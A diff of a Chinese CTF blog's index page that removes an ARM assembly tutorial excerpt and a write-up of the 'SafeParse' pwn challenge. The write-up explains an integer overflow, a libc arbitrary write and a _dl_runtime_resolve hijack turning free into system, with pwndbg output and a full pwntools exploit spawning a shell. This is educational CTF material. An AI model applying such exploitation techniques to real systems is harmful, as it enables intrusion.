-<li>向低地址增长的栈称为 <strong>递减栈</strong>（Acendant Stack） </li>
-</ul>
-<p>作为不同 Stack 实现的摘要，我们可以使用下表，其中描述了在不同情况下使用哪些存储多个/加载多个指令：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">堆栈类型</th>
-<th style="text-align:left">Store</th>
-<th style="text-align:left">Load</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">完全降序</td>
-<td style="text-align:left">STMFD （STMDB，Decrement Before）</td>
-<td style="text-align:left">LDMFD（LDM，Increment after）</td>
-</tr>
-<tr>
-<td style="text-align:center">完全升序</td>
-<td style="text-align:left">STMFA （STMIB，Increment Before）</td>
-<td style="text-align:left">LDMFA （LDMDA，Decrement After）</td>
-</tr>
-<tr>
-<td style="text-align:center">空降序</td>
-<td style="text-align:left">STMED （STMDA，Decrement After）</td>
-<td style="text-align:left">LDMED （LDMIB，Increment Before）</td>
-</tr>
-<tr>
-<td style="text-align:center">空升序</td>
-<td style="text-align:left">STMEA（STM，Increment after）</td>
-<td style="text-align:left">LDMEA （LDMDB，Decrement Before）</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p><strong>函数</strong></p>
-<p>要理解 ARM 中的函数，我们首先需要熟悉函数的结构部分，它们是：</p>
-<ol>
-<li>Prologue（序幕）</li>
-<li>Body（主体）</li>
-<li>Epilogue（结语）</li>
-</ol>
-<p><strong>Prologue（序幕）</strong>的目的是保存程序的先前状态（通过将 LR 和 R11 的值存储到堆栈上），并为函数的局部变量设置堆栈（虽然序言的实现可能因使用的编译器而异，但通常这是通过使用 PUSH / ADD / SUB 指令来完成的）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push &#123;r11, lr&#125; 		/* 序幕的开始,将帧指针和LR保存到堆栈 */</span><br><span class="line">add r11, sp, #0 	/* 设置栈底帧 */</span><br><span class="line">sub sp, sp, #16 	/* 序幕结束,在堆栈上分配一些缓冲区(这也为堆栈帧分配空间) */</span><br></pre></td></tr></table></figure>
-<p><strong>Body（主体）</strong> 部分通常负责某种独特而特定的任务，这部分函数可能包含各种指令，分支（跳转）到其他函数等，函数的 body 部分的示例可以像以下几条指令一样简单： </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov r0, #1 			/* 设置局部变量 (a=1)。 这也用作设置函数 max */ 的第一个参数</span><br><span class="line">mov r1, #2 			/* 设置局部变量 (b=2)。 这也用作设置函数 max */ 的第二个参数</span><br><span class="line">bl max 				/* 调用/分支到函数 max */</span><br></pre></td></tr></table></figure>
-<ul>
-<li>上面的示例代码显示了一个函数的片段，该函数设置局部变量，然后分支到另一个函数</li>
-<li>这段代码还向我们展示了函数的参数（在本例中为函数 max）是通过寄存器传递的</li>
-<li>在某些情况下，当有超过4个参数要传递时，我们会另外使用 Stack 来存储剩余的参数</li>
-<li>还值得一提的是，函数的结果通过寄存器 R0 返回，因此，无论函数（max）的结果是什么，我们应该能够在从函数返回后立即从寄存器 R0 中获取它</li>
-<li>需要指出的另一件事是，在某些情况下，结果的长度可能是64位（超过32位寄存器的大小） </li>
-</ul>
-<p>函数的最后一部分，即 <strong>Epilogue（结语）</strong>，用于将程序的状态恢复到其初始状态（在函数调用之前），以便它可以从它离开的位置继续，为此，我们需要重新调整堆栈指针（这是通过使用帧指针寄存器 R11 作为参考并执行添加或子操作来完成的）</p>
-<p>重新调整堆栈指针后，通过将以前（在序幕中）保存的寄存器值从堆栈中弹出到相应的寄存器中来恢复它们，根据函数类型，POP 指令可能是 Epilogue 的最终指令（但是，可能是在恢复寄存器值后，我们使用 BX 指令离开函数），Epilogue 的示例如下所示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub sp, r11, #0 		/* 结尾的开始,重新调整堆栈指针 */</span><br><span class="line">pop &#123;r11, pc&#125; 			/* 结尾,从堆栈中恢复帧指针,通过直接加载到PC中跳转到以前保存的LR,函数的堆栈帧最终在这一步被销毁 */</span><br></pre></td></tr></table></figure>
-<p>所以现在我们知道：</p>
-<ol>
-<li>Prologue（序幕）为功能设置环境</li>
-<li>Body（主体）实现函数的逻辑并将结果存储到 R0</li>
-<li>Epilogue（结语）还原状态，以便程序可以从调用函数之前离开的位置恢复</li>
-</ol>
-<p>参考：<a target="_blank" rel="noopener" href="https://azeria-labs.com/writing-arm-assembly-part-1/">编写 ARM 程序集|阿泽里亚实验室</a> </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/26/dl_runtime_resolve%20attack/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/26/dl_runtime_resolve%20attack/" class="post-title-link" itemprop="url">dl_runtime_resolve attack</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-08-26 17:36:41 / Modified: 17:38:57" itemprop="dateCreated datePublished" datetime="2022-08-26T17:36:41+08:00">2022-08-26</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>4.5k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>4 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>SafeParse</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SafeParse: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=bb35942986f3f07abe813fd1a86be5920f5b6c7e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/pwn_SafeParse/SafeParse&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，全开，开启延迟绑定</li>
-</ul>
-<p><strong>漏洞分析</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data_size = input_num();</span><br><span class="line">chunk = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span> * data_size);         <span class="comment">// 整数溢出</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>这里有一个整数溢出（这个漏洞点和初赛 newest_note 的非预期解很像）</li>
-</ul>
-<p>直接让 data_size 为 0x40040000，就可以让这个存堆指针的堆申请到 libc 上面</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>注意：这里的 size_t 代表的是 unsorted int（4字节）</li>
-</ul>
-<p>溢出过后，“data_size” 会特别大，但是 mmap 申请的 chunk 又比较小，以下的这个检查就形同虚设了：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &gt;= data_size )</span><br></pre></td></tr></table></figure>
-<p><strong>入侵思路</strong></p>
-<p>然后就可以实现 libc 任意写，由于没法 leak，我们只能打 <code>_dl_runtime_resolve</code></p>
-<p><code>DT_STRTAB</code> 在 elf 中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到 <code>DT_DEBUG</code> 这个表是指向 libc 地址（我们可以控制），可以通过改写最低位：</p>
-<ul>
-<li>把 <code>link_map-&gt;l_info[DT_STRTAB]</code> 低位覆盖为 <code>link_map-&gt;l_info[DT_DEBUG]</code> 这样程序就会误以为 <code>DT_DEBUG</code> 是 <code>DT_STRTAB</code>（这下放入 <code>_dl_lookup_symbol_x</code> 的第二个参数就会变成 <code>DT_DEBUG</code>）</li>
-<li>于是我们提前在 <code>DT_DEBUG+offset</code>（原来是 <code>DT_STRTAB+offset</code>）的位置写上 <code>system</code></li>
-<li>提前在 <code>chunk</code> 中写入 <code>/bin/sh</code></li>
-<li>最后在执行 <code>free(chunk)</code> 时就会 get shell</li>
-</ul>
-<p>低位覆盖 <code>link_map-&gt;l_info[DT_STRTAB]</code>，欺骗 <code>_dl_fixup</code> 函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f3b00ba2000</span>+<span class="number">0x324180</span>+<span class="number">0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi r10 <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7f3b00ec6198</span> ◂— <span class="number">0x6165720000ec6730</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7f3b00ec61a0</span> ◂— <span class="number">0x564f9b540064</span> <span class="comment">/* &#x27;d&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7f3b00ec61a8</span> —▸ <span class="number">0x7f3b00ec6740</span> —▸ <span class="number">0x7ffe633fe000</span> ◂— jg     <span class="number">0x7ffe633fe047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7f3b00ec61b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7f3b00ec61b8</span> —▸ <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7f3b00ec61c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7f3b00ec61c8</span> —▸ <span class="number">0x7f3b00ec6718</span> —▸ <span class="number">0x7f3b00ec6730</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│       <span class="number">0x7f3b00ec61d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│       <span class="number">0x7f3b00ec61d8</span> —▸ <span class="number">0x564f9b545de0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│       <span class="number">0x7f3b00ec61e0</span> —▸ <span class="number">0x564f9b545ec0</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│       <span class="number">0x7f3b00ec61e8</span> —▸ <span class="number">0x564f9b545eb0</span> ◂— <span class="number">0x3</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│ rdi<span class="number">-1</span> <span class="number">0x7f3b00ec61f0</span> ◂— <span class="number">0x6d657473797300</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│       <span class="number">0x7f3b00ec61f8</span> —▸ <span class="number">0x564f9b545ea0</span> ◂— <span class="number">0x15</span> <span class="comment">/* 低位覆盖&quot;\xa0&quot; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│       <span class="number">0x7f3b00ec6200</span> —▸ <span class="number">0x564f9b545e70</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│       <span class="number">0x7f3b00ec6208</span> —▸ <span class="number">0x564f9b545ef0</span> ◂— <span class="number">0x7</span></span><br></pre></td></tr></table></figure>
-<p><code>_dl_fixup-&gt;_dl_lookup_symbol_x</code> 执行前：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f3b00ea8192</span> &lt;_dl_fixup+<span class="number">210</span>&gt;    call   _dl_lookup_symbol_x                &lt;_dl_lookup_symbol_x&gt;</span><br><span class="line">       rdi: <span class="number">0x7f3b00ec61f1</span> ◂— <span class="number">0xa0006d6574737973</span> <span class="comment">/* &#x27;system&#x27;(free-&gt;system) */</span></span><br><span class="line">       rsi: <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line">       rdx: <span class="number">0x7ffe633dbfa8</span> —▸ <span class="number">0x564f9b547018</span> ◂— <span class="number">0x1200000091</span></span><br><span class="line">       rcx: <span class="number">0x7f3b00ec64f8</span> —▸ <span class="number">0x7f3b00ec6450</span> —▸ <span class="number">0x7f3b00e95590</span> —▸ <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— ...</span><br><span class="line">       r8: <span class="number">0x7f3b00e955e0</span> —▸ <span class="number">0x564f9b5480a0</span> ◂— <span class="string">&#x27;GLIBC_2.2.5&#x27;</span></span><br><span class="line">       r9: <span class="number">0x1</span></span><br><span class="line">       arg[<span class="number">6</span>]: <span class="number">0x1</span></span><br><span class="line">       arg[<span class="number">7</span>]: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<p>完整 exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./SafeParse1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./SafeParse1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x1620)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd += &quot;b *$rebase(0x15FA)\n&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,cmd)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0x101000</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">link_map_offset = <span class="number">0x324190</span>-<span class="number">0x10</span></span><br><span class="line">r_debug_offset = <span class="number">0x324160</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_offset))</span><br><span class="line">success(<span class="string">&quot;link_map_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(link_map_offset))</span><br><span class="line">success(<span class="string">&quot;link_map_offset+0x40+5*0x8 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>))</span><br><span class="line">success(<span class="string">&quot;r_debug_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(r_debug_offset))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># _IO_2_1_stdout_offset &gt;&gt; 0x2ee690</span></span><br><span class="line"><span class="comment"># link_map_offset &gt;&gt; 0x324180</span></span><br><span class="line"><span class="comment"># link_map_offset+0x40+5*0x8 &gt;&gt; 0x3241e8</span></span><br><span class="line"><span class="comment"># r_debug_offset &gt;&gt; 0x324150 </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&quot;&gt;*&gt;***&gt;***&gt;******&gt;**&gt;**&gt;**&quot;</span></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">36</span>+<span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">38</span></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">15</span>+<span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">17</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">38</span>+<span class="string">&quot;,&quot;</span>+<span class="string">&quot;.&quot;</span></span><br><span class="line"><span class="comment">#payload +=&quot;/&lt;//&lt;/&lt;/&lt;/&lt;//////&lt;///&lt;///&lt;/&lt;&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Code: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;/bin&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\x00sys&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;tem\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\x00rea&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;d\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\xa0&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Guess the Number: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><strong>小结：</strong></p>
-<p>这个题我看着就像强网杯的 qwarmup，都是任意写 libc，然后打 <code>_dl_runtime_resolve</code></p>
-<p>当时猪脑过载了，就想用 qwarmup 的方法来套这个题，调了半天才发现这个题没有开沙盒，可以直接 get shell（唉）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -2512,7 +2051,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">180</span>
+          <span class="site-state-item-count">182</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2525,7 +2064,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">114</span>
+        <span class="site-state-item-count">115</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2566,7 +2105,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">35:40</span>
+    <span title="Reading time total">35:51</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
